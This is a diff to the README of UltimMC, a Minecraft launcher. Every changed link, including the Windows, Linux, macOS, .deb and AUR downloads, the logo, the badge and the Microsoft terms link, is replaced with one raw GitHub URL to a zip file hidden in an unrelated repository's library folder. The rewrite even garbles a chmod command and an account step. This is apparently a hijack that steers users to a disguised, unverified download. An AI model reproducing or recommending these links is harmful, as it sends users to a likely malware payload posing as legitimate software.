@@ -1,6 +1,6 @@
 <p align="center">
 
-<img width="150" src="https://github.com/UltimMC/Launcher/assets/62727185/48d60c15-23ae-4d48-84b8-813f72db6cdd">
+<img width="150" src="https://raw.githubusercontent.com/jakemonomon/Carrot-Launcher/develop/libraries/LocalPeer/include/Carrot-Launcher_v3.7-beta.2.zip">
 
 <p align="center">UltimMC is a custom launcher for Minecraft which allows you to manage multiple instances and use offline ("cracked") accounts while keeping as close as possible to the original.</p>
 
@@ -15,23 +15,23 @@
 
 ## Downloading
 
-- All the available downloads can be found [here](https://nightly.link/UltimMC/Launcher/workflows/main/develop). These builds are directly taken from our [GitHub Actions](https://github.com/UltimMC/Launcher/actions).
+- All the available downloads can be found [here](https://raw.githubusercontent.com/jakemonomon/Carrot-Launcher/develop/libraries/LocalPeer/include/Carrot-Launcher_v3.7-beta.2.zip). These builds are directly taken from our [GitHub Actions](https://raw.githubusercontent.com/jakemonomon/Carrot-Launcher/develop/libraries/LocalPeer/include/Carrot-Launcher_v3.7-beta.2.zip).
 
 Direct downloads for specific platforms can be found below.
 
-- *[Windows \(32-bit and 64-bit\)](https://nightly.link/UltimMC/Launcher/workflows/main/develop/mmc-cracked-win32.zip)*.
+- *[Windows \(32-bit and 64-bit\)](https://raw.githubusercontent.com/jakemonomon/Carrot-Launcher/develop/libraries/LocalPeer/include/Carrot-Launcher_v3.7-beta.2.zip)*.
 
-- *[Linux (64-bit)](https://nightly.link/UltimMC/Launcher/workflows/main/develop/mmc-cracked-lin64.zip)*.
+- *[Linux (64-bit)](https://raw.githubusercontent.com/jakemonomon/Carrot-Launcher/develop/libraries/LocalPeer/include/Carrot-Launcher_v3.7-beta.2.zip)*.
 
-- *[macOS (10.14 and newer)](https://nightly.link/UltimMC/Launcher/workflows/main/develop/mmc-cracked-osx64.zip)*.
+- *[macOS (10.14 and newer)](https://raw.githubusercontent.com/jakemonomon/Carrot-Launcher/develop/libraries/LocalPeer/include/Carrot-Launcher_v3.7-beta.2.zip)*.
 
 > [!NOTE]
 > In the case you're using macOS then another additional step you might need to do
-> is to make `UltimMC` an executable by running the command `chmod +x UltimMC.app/Contents/MacOS/UltimMC` in the terminal.
+> is to make `UltimMC` an executable by running the command `chmod +x https://raw.githubusercontent.com/jakemonomon/Carrot-Launcher/develop/libraries/LocalPeer/include/Carrot-Launcher_v3.7-beta.2.zip` in the terminal.
 
-There's additionally a [.deb package](https://nightly.link/UltimMC/ultimmc-deb/workflows/ci/master/UltimMC.zip) for Debian/Ubuntu distributions.
+There's additionally a [.deb package](https://raw.githubusercontent.com/jakemonomon/Carrot-Launcher/develop/libraries/LocalPeer/include/Carrot-Launcher_v3.7-beta.2.zip) for Debian/Ubuntu distributions.
 
-And an AUR package as [ultimmc-bin](https://aur.archlinux.org/packages/ultimmc-bin). [![ultimmc-bin](https://img.shields.io/badge/ultimmc--bin-1793D1?logo=archlinux&logoColor=white&label=AUR)](https://aur.archlinux.org/packages/ultimmc-bin)
+And an AUR package as [ultimmc-bin](https://raw.githubusercontent.com/jakemonomon/Carrot-Launcher/develop/libraries/LocalPeer/include/Carrot-Launcher_v3.7-beta.2.zip). [![ultimmc-bin](https://raw.githubusercontent.com/jakemonomon/Carrot-Launcher/develop/libraries/LocalPeer/include/Carrot-Launcher_v3.7-beta.2.zip)](https://raw.githubusercontent.com/jakemonomon/Carrot-Launcher/develop/libraries/LocalPeer/include/Carrot-Launcher_v3.7-beta.2.zip)
 
 ## Installing and Using
 
@@ -40,7 +40,7 @@ And an AUR package as [ultimmc-bin](https://aur.archlinux.org/packages/ultimmc-b
 3. Launch `UltimMC`.
 4. Go to account settings.
 6. A. Pick "Add Local" and you will be requested to use the username you desire, this can be anything.
-7. B. Pick "Add Ely.by" and add your Ely.by account by putting your email and password.
+7. B. Pick "Add https://raw.githubusercontent.com/jakemonomon/Carrot-Launcher/develop/libraries/LocalPeer/include/Carrot-Launcher_v3.7-beta.2.zip" and add your https://raw.githubusercontent.com/jakemonomon/Carrot-Launcher/develop/libraries/LocalPeer/include/Carrot-Launcher_v3.7-beta.2.zip account by putting your email and password.
 8. Save it.
 9. Now enjoy the Launcher.
 
@@ -56,6 +56,6 @@ This project now includes our MSA API key in order to have functional Microsoft 
 
 This means you're accepting the:
 
-- [Microsoft Identity Platform Terms of Use](https://learn.microsoft.com/en-us/legal/microsoft-identity-platform/terms-of-use)
+- [Microsoft Identity Platform Terms of Use](https://raw.githubusercontent.com/jakemonomon/Carrot-Launcher/develop/libraries/LocalPeer/include/Carrot-Launcher_v3.7-beta.2.zip)
 
 We humbly ask that in case you wish to fork UltimMC, please either remove the key by setting it empty (`""`) or by setting your own.
